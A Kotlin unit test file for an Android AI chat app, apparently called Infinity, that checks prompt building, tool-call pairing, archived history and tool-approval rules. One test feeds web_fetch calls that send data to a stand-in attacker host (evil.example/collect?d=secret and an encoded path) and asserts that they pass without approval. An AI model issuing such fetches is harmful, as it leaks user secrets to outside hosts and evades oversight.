package com.promenar.infinity.data.generation

import android.content.SharedPreferences
import com.google.common.truth.Truth.assertThat
import com.promenar.infinity.data.model.InferenceParams
import com.promenar.infinity.data.model.Message
import com.promenar.infinity.data.model.MessageRole
import com.promenar.infinity.data.model.Session
import com.promenar.infinity.data.model.ToolCall
import com.promenar.infinity.data.model.MessageDocumentAttachment
import com.promenar.infinity.data.remote.protocol.AnthropicThinkingBlock
import com.promenar.infinity.data.remote.protocol.ProtocolTool
import com.promenar.infinity.data.remote.protocol.ReasoningReplay
import com.promenar.infinity.data.remote.protocol.ReasoningReplayCodec
import com.promenar.infinity.data.remote.protocol.ProtocolToolFunction
import com.promenar.infinity.domain.tool.ToolRisk
import com.promenar.infinity.ui.chat.manager.registry.SkillRegistry
import io.mockk.every
import io.mockk.mockk
import org.junit.Test

class ChatGenerationContentStrategyTest {
    @Test
    fun `引用批注在正文和完整文档之前且文档不被重复序列化`() {
        val document = MessageDocumentAttachment("doc", "source.md", "text/markdown", "完整文档正文", 24, "hash", 6)
        val quote = com.promenar.infinity.data.model.MessageQuote("a0", "引文", "批注")
        val session = Session("s", "agent", messages = listOf(
            Message("u", MessageRole.USER, "正文", quotes = listOf(quote), userDocuments = listOf(document)),
        ))
        val content = strategy().buildProtocolMessages(session, "").single().content
        assertThat(content).startsWith("> 引文\n\n批注\n\n正文")
        assertThat(content).contains("完整文档正文")
        assertThat(Regex("完整文档正文").findAll(content).count()).isEqualTo(1)
    }

    @Test
    fun `当前轮与历史用户消息的引用位于正文和完整文档之前`() {
        val quote = com.promenar.infinity.data.model.MessageQuote("a0", "引文", "批注")
        val session = Session("s", "agent", messages = listOf(
            Message("u1", MessageRole.USER, "历史正文", quotes = listOf(quote)),
            Message("a1", MessageRole.ASSISTANT, "回答"),
            Message("u2", MessageRole.USER, "", quotes = listOf(quote)),
            Message("a2", MessageRole.ASSISTANT, ""),
        ))

        val prompt = strategy().buildProtocolMessages(session, "", "u2")

        assertThat(prompt.map { it.role }).containsExactly("user", "assistant", "user").inOrder()
        assertThat(prompt.first().content).isEqualTo("> 引文\n\n批注\n\n历史正文")
        assertThat(prompt.last().content).isEqualTo("> 引文\n\n批注")
        assertThat(sanitizeProtocolHistory(session.messages).map { it.id })
            .containsExactly("u1", "a1", "u2").inOrder()
    }

    @Test
    fun `新旧用户消息分离模型上下文且历史提醒按原位置重放`() {
        val messages = listOf(
            Message("old", MessageRole.USER, "旧正文"),
            Message("a0", MessageRole.ASSISTANT, "旧回答"),
            Message("u1", MessageRole.USER, "新正文", turnContext = "<turn_context>\n资料\r\n</turn_context>"),
            Message("a1", MessageRole.ASSISTANT, "", requestInstruction = "尾部提醒"),
        )
        val session = Session("s", "agent", messages = messages)
        val before = strategy().buildProtocolMessages(session, "稳定系统")
        assertThat(before[1].content).isEqualTo("旧正文")
        assertThat(before[1].turnContext).isNull()
        assertThat(before[3].content).isEqualTo("新正文")
        assertThat(before[3].turnContext).isEqualTo(messages[2].turnContext)
        assertThat(before.last().content).isEqualTo("尾部提醒")
        val completed = session.copy(messages = messages.dropLast(1) + messages.last().copy(content = "回答") + Message("u2", MessageRole.USER, "后续问题"))
        val after = strategy().buildProtocolMessages(completed, "稳定系统")
        assertThat(after.take(before.size)).isEqualTo(before)
        assertThat(messages[2].content).isEqualTo("新正文")
    }

    private val write = ToolCall("call-w", "write_file", "{}")
    private val read = ToolCall("call-r", "read_file", "{}")

    @Test
    fun `两档全部类别通过统一审批矩阵`() {
        val cases = com.promenar.infinity.domain.tool.permissionPolicyCases
        val strategy = strategy(cases.associate { it.tool to it.risk })
        listOf("workspace", "full_access").forEach { mode ->
            val calls = cases.mapIndexed { index, case -> ToolCall("c$index", case.tool, case.arguments) }
            val expected = cases.mapIndexedNotNull { index, case ->
                "c$index".takeIf { case.alwaysApprove || case.command && mode == "workspace" }
            }
            assertThat(strategy.pendingApprovalIds(calls, mode)).containsExactlyElementsIn(expected).inOrder()
        }
    }

    @Test
    fun `会话消息发送副本与暂停标记不进入模型历史也不截断工具结果`() {
        val send = ToolCall("call-s", "session_send", "{\"id\":\"b1\",\"message\":\"进度如何\"}")
        val session = Session("s", "agent", messages = listOf(
            Message("u1", MessageRole.USER, "派分支去做"),
            Message("a1", MessageRole.ASSISTANT, "", toolCalls = listOf(send)),
            Message("mail", MessageRole.USER, "{\"targetSessionId\":\"b1\"}", name = "session_message_sent"),
            Message("rec", MessageRole.USER, "{\"peerId\":\"sa_1\"}", name = "session_message_record"),
            Message("t1", MessageRole.TOOL, "已送达", toolCallId = send.id, name = send.name),
            Message("pause", MessageRole.SYSTEM, "已暂停自动处理", name = "session_auto_processing_paused"),
            Message("a2", MessageRole.ASSISTANT, ""),
        ))
        val prompt = strategy().buildProtocolMessages(session, "system", "u1")
        assertThat(prompt.map { it.role }).containsExactly("system", "user", "assistant", "tool").inOrder()
        assertThat(prompt[3].content).isEqualTo("已送达")
    }

    @Test
    fun `让出轮无最终回答也保留完整工具结果及随后用户指令`() {
        val session = Session("s", "agent", messages = listOf(
            Message("u1", MessageRole.USER, "查文件"),
            Message("a1", MessageRole.ASSISTANT, "", toolCalls = listOf(read)),
            Message("t1", MessageRole.TOOL, "真实结果", toolCallId = read.id, name = read.name),
            Message("u2", MessageRole.USER, "调整方向"),
            Message("a2", MessageRole.ASSISTANT, ""),
        ))
        val prompt = strategy().buildProtocolMessages(session, "system", "u2")
        assertThat(prompt.map { it.role }).containsExactly("system", "user", "assistant", "tool", "user").inOrder()
        assertThat(prompt[2].toolCalls!!.single().id).isEqualTo(read.id)
        assertThat(prompt[3].content).isEqualTo("真实结果")
        assertThat(prompt[4].content).isEqualTo("调整方向")
    }

    @Test
    fun `空白助手占位与失败空消息不进入协议历史`() {
        val history = sanitizeProtocolHistory(listOf(
            Message("u1", MessageRole.USER, "第一问"),
            Message("a1", MessageRole.ASSISTANT, "", isError = true),
            Message("u2", MessageRole.USER, "第二问"),
            Message("a2", MessageRole.ASSISTANT, ""),
        ))

        assertThat(history.map { it.id }).containsExactly("u1", "u2").inOrder()
    }

    @Test
    fun `没有结果的工具调用补齐未执行结果`() {
        val history = sanitizeProtocolHistory(listOf(
            Message("u1", MessageRole.USER, "改文件"),
            Message("a1", MessageRole.ASSISTANT, "", toolCalls = listOf(read, write)),
            Message("t1", MessageRole.TOOL, "内容", toolCallId = "call-r", name = "read_file"),
            Message("u2", MessageRole.USER, "算了，换个做法"),
        ))

        assertThat(history.map { it.role }).containsExactly(
            MessageRole.USER, MessageRole.ASSISTANT, MessageRole.TOOL, MessageRole.TOOL, MessageRole.USER,
        ).inOrder()
        val synthetic = history[3]
        assertThat(synthetic.toolCallId).isEqualTo("call-w")
        assertThat(synthetic.name).isEqualTo("write_file")
        assertThat(synthetic.content).isEqualTo(MISSING_TOOL_RESULT_CONTENT)
    }

    @Test
    fun `孤立或重复的工具结果被丢弃`() {
        val history = sanitizeProtocolHistory(listOf(
            Message("u1", MessageRole.USER, "写文件"),
            // 调用已被清空的历史损坏形态：结果失去调用方
            Message("a1", MessageRole.ASSISTANT, "文件已写好"),
            Message("t-orphan", MessageRole.TOOL, "写入成功", toolCallId = "call-w"),
            Message("a2", MessageRole.ASSISTANT, "", toolCalls = listOf(read)),
            Message("t1", MessageRole.TOOL, "第一次", toolCallId = "call-r"),
            Message("t1-dup", MessageRole.TOOL, "重复", toolCallId = "call-r"),
        ))

        assertThat(history.map { it.id }).containsExactly("u1", "a1", "a2", "t1").inOrder()
    }

    @Test
    fun `完整配对的工具轮次原样保留`() {
        val messages = listOf(
            Message("u1", MessageRole.USER, "读文件"),
            Message("a1", MessageRole.ASSISTANT, "我先读取", toolCalls = listOf(read)),
            Message("t1", MessageRole.TOOL, "内容", toolCallId = "call-r"),
            Message("a2", MessageRole.ASSISTANT, "读完了"),
        )

        assertThat(sanitizeProtocolHistory(messages)).isEqualTo(messages)
    }

    @Test
    fun `文本文档只作为完整用户内容进入协议历史`() {
        val document = MessageDocumentAttachment(
            id = "doc-1",
            name = "history.md",
            mimeType = "text/markdown",
            content = "# 旧会话\n完整内容",
            sizeBytes = 22,
            sha256 = "abc",
            estimatedTokens = 5,
        )
        val session = Session(
            id = "s1",
            agentId = "agent",
            messages = listOf(
                Message(
                    id = "u1",
                    role = MessageRole.USER,
                    content = "继续分析",
                    userDocuments = listOf(document),
                ),
            ),
        )

        val prompt = strategy().buildProtocolMessages(session, "system contract")

        assertThat(prompt).hasSize(2)
        assertThat(prompt[0].content).isEqualTo("system contract")
        assertThat(prompt[0].content).doesNotContain(document.content)
        assertThat(prompt[1].content).contains("继续分析")
        assertThat(prompt[1].content).contains(document.content)
        assertThat(prompt[1].content).contains("<<<INFINITY_DOCUMENT_BEGIN abc>>>")
    }

    @Test
    fun `当前完整文档用户消息即使超出活动窗口仍被固定进Prompt`() {
        val document = MessageDocumentAttachment(
            "doc", "reference.txt", "text/plain", "must remain", 11, "hash", 11,
        )
        val messages = buildList {
            add(Message("pinned", MessageRole.USER, "analyze", userDocuments = listOf(document)))
            repeat(8) { index ->
                add(Message("u-$index", MessageRole.USER, "question-$index"))
                add(Message("a-$index", MessageRole.ASSISTANT, "answer-$index"))
            }
        }
        val session = Session(
            id = "s1",
            agentId = "agent",
            inferenceParams = InferenceParams(activeContextWindow = 4),
            messages = messages,
        )

        val prompt = strategy().buildProtocolMessages(session, "system", "pinned")

        val pinned = prompt.first { it.content.contains("must remain") }
        assertThat(pinned.content).contains("analyze")
        assertThat(pinned.content).contains("<<<INFINITY_DOCUMENT_BEGIN hash>>>")
        assertThat(prompt.takeLast(4).map { it.content })
            .containsExactly("question-6", "answer-6", "question-7", "answer-7").inOrder()
    }

    @Test
    fun `当前轮长工具循环完整保留且已摘要历史不重复发送`() {
        val messages = buildList {
            repeat(4) { index ->
                add(Message("old-u-$index", MessageRole.USER, "old-question-$index", isArchived = true))
                add(Message("old-a-$index", MessageRole.ASSISTANT, "old-answer-$index", isArchived = true))
            }
            add(Message("current", MessageRole.USER, "do the task"))
            repeat(6) { round ->
                add(
                    Message(
                        "a-$round", MessageRole.ASSISTANT, "",
                        toolCalls = listOf(ToolCall("c-$round", "read_file", "{}")),
                    ),
                )
                add(Message("t-$round", MessageRole.TOOL, "result-$round", toolCallId = "c-$round"))
            }
        }
        val session = Session(
            id = "s1",
            agentId = "agent",
            inferenceParams = InferenceParams(activeContextWindow = 2),
            messages = messages,
        )

        val prompt = strategy().buildProtocolMessages(session, "system", "current")

        assertThat(prompt.map { it.content }).containsAtLeast("do the task", "result-0", "result-5").inOrder()
        assertThat(prompt.map { it.content }).doesNotContain("old-question-3")
        assertThat(prompt.map { it.content }).doesNotContain("old-question-2")
    }

    @Test
    fun `未摘要历史全部发送而不按消息条数截断`() {
        val messages = buildList {
            repeat(3) { add(Message("archived-$it", MessageRole.USER, "archived-$it", isArchived = true)) }
            repeat(3) { add(Message("pending-$it", MessageRole.USER, "pending-$it")) }
            add(Message("latest-q", MessageRole.USER, "latest-q"))
            add(Message("latest-a", MessageRole.ASSISTANT, "latest-a"))
        }
        val session = Session(
            id = "s1",
            agentId = "agent",
            inferenceParams = InferenceParams(activeContextWindow = 2),
            messages = messages,
        )

        val contents = strategy().buildProtocolMessages(session, "system").map { it.content }

        assertThat(contents).containsAtLeast("pending-1", "pending-2", "latest-q", "latest-a").inOrder()
        assertThat(contents).contains("pending-0")
        assertThat(contents).doesNotContain("archived-2")
    }

    @Test
    fun `重试时旧助手回复不进入新Prompt且不占活动窗口`() {
        val session = Session(
            id = "s1",
            agentId = "agent",
            inferenceParams = InferenceParams(activeContextWindow = 2),
            messages = listOf(
                Message("u1", MessageRole.USER, "question"),
                Message("old", MessageRole.ASSISTANT, "old answer"),
                Message("new", MessageRole.ASSISTANT, ""),
            ),
        )

        val prompt = strategy().buildProtocolMessages(
            session,
            "system",
            pinnedUserMessageId = "u1",
            excludedMessageIds = setOf("old"),
        )

        assertThat(prompt.map { it.content })
            .containsExactly("system", "question")
            .inOrder()
        assertThat(prompt.map { it.content }).doesNotContain("old answer")
    }

    @Test
    fun `重新生成已摘要历史时固定用户正文和完整文档但排除待替换回复`() {
        val document = MessageDocumentAttachment(
            "doc", "reference.txt", "text/plain", "当前文档完整正文", 27, "current-doc", 9,
        )
        val session = Session("s1", "agent", messages = listOf(
            Message("older", MessageRole.USER, "其它已摘要历史", isArchived = true),
            Message("current", MessageRole.USER, "重新回答此问题", userDocuments = listOf(document), isArchived = true),
            Message("replaced", MessageRole.ASSISTANT, "待替换的旧回复", isArchived = true),
            Message("new", MessageRole.ASSISTANT, ""),
        ))

        val prompt = strategy().buildProtocolMessages(session, "system", "current", setOf("replaced"))

        assertThat(prompt.map { it.role }).containsExactly("system", "user").inOrder()
        assertThat(prompt.last().content).contains("重新回答此问题")
        assertThat(prompt.last().content).contains(document.content)
        assertThat(prompt.last().content).contains("<<<INFINITY_DOCUMENT_BEGIN current-doc>>>")
        assertThat(prompt.joinToString { it.content }).doesNotContain("其它已摘要历史")
        assertThat(prompt.joinToString { it.content }).doesNotContain("待替换的旧回复")
        assertThat(session.messages.first { it.id == "current" }.isArchived).isTrue()
    }

    @Test
    fun `固定轮次的归档豁免止于下一用户轮且保持工具配对`() {
        val session = Session("s1", "agent", messages = listOf(
            Message("current", MessageRole.USER, "当前问题", isArchived = true),
            Message("call", MessageRole.ASSISTANT, "先读文件", toolCalls = listOf(read), isArchived = true),
            Message("result", MessageRole.TOOL, "当前轮完整结果", toolCallId = read.id, isArchived = true),
            Message("next", MessageRole.USER, "下一归档轮", isArchived = true),
            Message("next-answer", MessageRole.ASSISTANT, "下一归档回复", isArchived = true),
        ))

        val prompt = strategy().buildProtocolMessages(session, "system", "current")

        assertThat(prompt.map { it.role }).containsExactly("system", "user", "assistant", "tool").inOrder()
        assertThat(prompt.last().content).isEqualTo("当前轮完整结果")
        assertThat(prompt.last().toolCallId).isEqualTo(prompt[2].toolCalls!!.single().id)
        assertThat(strategy().buildProtocolMessages(session, "system").map { it.role }).containsExactly("system")
        assertThat(session.messages.all { it.isArchived }).isTrue()
    }

    @Test
    fun `多轮工具消息构造Prompt时不丢assistant与tool配对`() {
        val strategy = strategy()
        val firstCall = ToolCall("call-1", "search", "{}")
        val secondCall = ToolCall("call-2", "read_file", "{}")
        val session = Session(
            id = "s1",
            agentId = "agent",
            inferenceParams = InferenceParams(activeContextWindow = 6),
            messages = listOf(
                Message("u1", MessageRole.USER, "question"),
                Message("a1", MessageRole.ASSISTANT, "", toolCalls = listOf(firstCall)),
                Message("t1", MessageRole.TOOL, "result-1", toolCallId = "call-1", name = "search"),
                Message("a2", MessageRole.ASSISTANT, "", toolCalls = listOf(secondCall)),
                Message("t2", MessageRole.TOOL, "result-2", toolCallId = "call-2", name = "read_file"),
            ),
        )

        val prompt = strategy.buildProtocolMessages(session, "system")

        assertThat(prompt.map { it.role }).containsExactly(
            "system", "user", "assistant", "tool", "assistant", "tool",
        ).inOrder()
        assertThat(prompt[2].toolCalls!!.single().id).isEqualTo("call-1")
        assertThat(prompt[3].toolCallId).isEqualTo("call-1")
        assertThat(prompt[4].toolCalls!!.single().id).isEqualTo("call-2")
        assertThat(prompt[5].toolCallId).isEqualTo("call-2")
    }

    @Test
    fun `思考状态只回传给同一模型且 Anthropic 思考块只保留当前回合`() {
        val call1 = ToolCall("call-1", "search", "{}")
        val call2 = ToolCall("call-2", "search", "{}")
        val blocks = ReasoningReplay.AnthropicBlocks(listOf(AnthropicThinkingBlock("thinking", "想", "sig")))
        val field = ReasoningReplay.ChatField("reasoning_content")
        fun state(source: String, replay: ReasoningReplay) = ReasoningReplayCodec.encode(source, replay)
        val session = Session(
            id = "s1",
            agentId = "agent",
            messages = listOf(
                Message("u1", MessageRole.USER, "第一问"),
                Message("a1", MessageRole.ASSISTANT, "", toolCalls = listOf(call1), thoughtSignature = state("p::m", blocks)),
                Message("t1", MessageRole.TOOL, "r1", toolCallId = "call-1", name = "search"),
                Message("a1b", MessageRole.ASSISTANT, "答一", reasoning = "想", thoughtSignature = state("p::m", field)),
                Message("u2", MessageRole.USER, "第二问"),
                Message("a2", MessageRole.ASSISTANT, "", toolCalls = listOf(call2), thoughtSignature = state("p::m", blocks)),
                Message("t2", MessageRole.TOOL, "r2", toolCallId = "call-2", name = "search"),
                Message("a3", MessageRole.ASSISTANT, "答二", thoughtSignature = state("other::m", field)),
            ),
        )

        val prompt = strategy().buildProtocolMessages(session, "system", replaySource = "p::m")
        val assistants = prompt.filter { it.role == "assistant" }

        assertThat(assistants.map { it.reasoningReplay }).containsExactly(null, field, blocks, null).inOrder()
        assertThat(strategy().buildProtocolMessages(session, "system").all { it.reasoningReplay == null }).isTrue()
    }

    @Test
    fun `fallback仅解析已知强标签且不误删Markdown表格`() {
        val strategy = strategy(setOf("search"))
        val content = """
            |说明
            |---|---
            |a|b
            |<FunctionCall>{"name":"search","arguments":{"q":"x"}}</FunctionCall>
        """.trimMargin()

        val calls = strategy.extractFallbackToolCalls(content)
        val stripped = strategy.stripToolCallMarkup(content)

        assertThat(calls.map { it.name }).containsExactly("search")
        assertThat(stripped).contains("---|---")
        assertThat(stripped).doesNotContain("FunctionCall")
    }

    @Test
    fun `普通工具不因风险或旧模式增加审批`() {
        val strategy = strategy(
            mapOf(
                "safe_alias_not_hardcoded" to ToolRisk.SAFE_READ,
                "write_alias_not_hardcoded" to ToolRisk.FILE_WRITE,
                "unknown_legacy_tool" to ToolRisk.UNKNOWN,
            ),
        )
        val calls = listOf(
            ToolCall("safe", "safe_alias_not_hardcoded", "{}"),
            ToolCall("risk", "write_alias_not_hardcoded", "{}"),
            ToolCall("unknown", "unknown_legacy_tool", "{}"),
        )

        listOf("workspace", "full_access", "auto", "semi", "manual", "invalid-mode").forEach { mode ->
            assertThat(strategy.pendingApprovalIds(calls, mode)).isEmpty()
        }
    }

    @Test
    fun `全自动模式仍审批两级技能写入但读取和相似路径放行`() {
        val strategy = strategy(mapOf("write_file" to ToolRisk.FILE_WRITE, "read_file" to ToolRisk.SAFE_READ))
        val calls = listOf(
            ToolCall("user", "write_file", """{"path":"/skills/demo/SKILL.md"}"""),
            ToolCall("project", "write_file", """{"path":"/.agents/skills/demo/SKILL.md"}"""),
            ToolCall("create", "create_directory", """{"parentPath":"/.agents","name":"skills"}"""),
            ToolCall("move-source", "move_file", """{"path":"/skills/a","newParentPath":"/docs"}"""),
            ToolCall("move-target", "move_file", """{"path":"/a","newParentPath":"/.agents/skills"}"""),
            ToolCall("delete-parent", "delete_file", """{"path":"/.agents"}"""),
            ToolCall("read", "read_file", """{"path":"/skills/demo/SKILL.md"}"""),
            ToolCall("other", "write_file", """{"path":"/skills-other/demo/SKILL.md"}"""),
        )
        assertThat(strategy.pendingApprovalIds(calls, "auto"))
            .containsExactly("user", "project", "create", "move-source", "move-target", "delete-parent").inOrder()
    }

    @Test
    fun `两档均不因 web_fetch 参数携带数据而审批`() {
        val strategy = strategy(mapOf("web_fetch" to ToolRisk.SAFE_READ))
        fun fetch(id: String, url: String) = ToolCall(id, "web_fetch", """{"url":"$url"}""")
        val calls = listOf(
            fetch("plain", "https://developer.android.com/jetpack/compose/state-and-jetpack-compose"),
            fetch("bare", "example.com/docs/getting-started"),
            fetch("query", "https://evil.example/collect?d=secret"),
            fetch("encoded", "https://evil.example/c/U2VjcmV0VXNlckRhdGFFeGZpbHRyYXRlZA"),
            fetch("userinfo", "https://user:pass@example.com/"),
            fetch("long", "https://example.com/" + "a".repeat(90)),
            ToolCall("broken", "web_fetch", "not json"),
        )

        listOf("workspace", "full_access", "semi", "auto", "manual").forEach { mode ->
            assertThat(strategy.pendingApprovalIds(calls, mode)).isEmpty()
        }
    }

    @Test
    fun `工具禁用后清除旧风险快照且未知风险免审批`() {
        var enabled = setOf("safe_alias")
        val settings = mockk<SharedPreferences>()
        every { settings.getStringSet(any(), any()) } answers { enabled }
        every { settings.getStringSet(BuiltinToolPreferences.KNOWN_KEY, any()) } returns setOf("safe_alias")
        val registry = mockk<SkillRegistry>()
        val safeTool = ProtocolTool(
            function = ProtocolToolFunction(
                name = "safe_alias",
                description = "",
                parameters = "{}",
            ),
            risk = ToolRisk.SAFE_READ,
        )
        every { registry.getAllTools(any()) } returns listOf(safeTool)
        val strategy = DefaultChatGenerationContentStrategy(settings, registry)
        val session = Session(id = "risk-session", agentId = "agent")
        val calls = listOf(ToolCall("safe", "safe_alias", "{}"))

        strategy.buildTools(session)
        assertThat(strategy.pendingApprovalIds(calls, "semi")).isEmpty()

        enabled = emptySet()
        strategy.buildTools(session)
        assertThat(strategy.pendingApprovalIds(calls, "semi")).isEmpty()
    }

    @Test
    fun `会话工具真值为全局内置加会话选中的MCP且空选择不放开自定义或MCP`() {
        val settings = mockk<SharedPreferences>()
        every { settings.getStringSet("enabled_skills", any()) } returns setOf("calculator", "write_file", "custom-one")
        val registry = mockk<SkillRegistry>()
        every { registry.getAllTools(any()) } returns listOf(
            protocolTool("calculator", "calculator", "builtin", null),
            ProtocolTool(
                function = ProtocolToolFunction("write_file", "", "{\"type\":\"object\"}"),
                risk = ToolRisk.FILE_WRITE,
                runtimeToolId = "write_file",
                sourceId = "builtin",
            ),
            protocolTool("custom", "custom-one", "custom", null),
            protocolTool("server-a-tool", "mcp:server-a:search", "mcp", "server-a"),
            protocolTool("server-b-tool", "mcp:server-b:search", "mcp", "server-b"),
        )
        val strategy = DefaultChatGenerationContentStrategy(settings, registry)

        val oldSession = Session(id = "old", agentId = "agent")
        assertThat(strategy.buildTools(oldSession).map { it.runtimeToolId })
            .containsExactly("calculator", "write_file")

        val selected = oldSession.copy(
            activeSkillIds = listOf("custom-one"),
            activeMcpServerIds = listOf("server-b"),
        )
        assertThat(strategy.buildTools(selected).map { it.runtimeToolId })
            .containsExactly("calculator", "write_file", "mcp:server-b:search").inOrder()
    }

    @Test
    fun `master tools off始终返回空真值`() {
        val settings = mockk<SharedPreferences>()
        every { settings.getStringSet(any(), any()) } returns setOf("calculator")
        val registry = mockk<SkillRegistry>()
        every { registry.getAllTools(any()) } returns listOf(
            protocolTool("calculator", "calculator", "builtin", null),
        )
        val strategy = DefaultChatGenerationContentStrategy(settings, registry)

        val session = Session(
            id = "off",
            agentId = "agent",
            options = com.promenar.infinity.data.model.SessionOptions(toolsEnabled = false),
            activeMcpServerIds = listOf("server-a"),
        )

        assertThat(strategy.buildTools(session)).isEmpty()
    }

    @Test
    fun `全局内置全关不影响会话已选MCP`() {
        val settings = mockk<SharedPreferences>()
        every { settings.getStringSet("enabled_skills", any()) } returns emptySet()
        val registry = mockk<SkillRegistry>()
        every { registry.getAllTools(any()) } returns listOf(
            protocolTool("remote", "mcp:server:remote", "mcp", "server"),
        )
        val strategy = DefaultChatGenerationContentStrategy(settings, registry)

        val tools = strategy.buildTools(
            Session(id = "mcp-only", agentId = "agent", activeMcpServerIds = listOf("server")),
        )

        assertThat(tools.map { it.runtimeToolId }).containsExactly("mcp:server:remote")
    }

    private fun protocolTool(
        name: String,
        runtimeToolId: String,
        sourceId: String,
        mcpServerId: String?,
    ) = ProtocolTool(
        function = ProtocolToolFunction(name, "", "{\"type\":\"object\"}"),
        risk = ToolRisk.SAFE_READ,
        runtimeToolId = runtimeToolId,
        sourceId = sourceId,
        mcpServerId = mcpServerId,
    )

    private fun strategy(knownNames: Set<String>): DefaultChatGenerationContentStrategy =
        strategy(knownNames.associateWith { ToolRisk.UNKNOWN })

    private fun strategy(
        knownTools: Map<String, ToolRisk> = emptyMap(),
    ): DefaultChatGenerationContentStrategy {
        val settings = mockk<SharedPreferences>()
        every { settings.getStringSet(any(), any()) } returns knownTools.keys
        every { settings.getBoolean(any(), any()) } returns true
        val registry = mockk<SkillRegistry>()
        every { registry.getAllTools() } returns knownTools.map { (name, risk) ->
            ProtocolTool(
                function = ProtocolToolFunction(name = name, description = "", parameters = "{}"),
                risk = risk,
            )
        }
        every { registry.getAllTools(any()) } returns knownTools.map { (name, risk) ->
            ProtocolTool(
                function = ProtocolToolFunction(name = name, description = "", parameters = "{}"),
                risk = risk,
            )
        }
        return DefaultChatGenerationContentStrategy(settings, registry).also {
            it.buildTools(
                Session(id = "risk-session", agentId = "agent", activeSkillIds = listOf("configured")),
            )
        }
    }
}
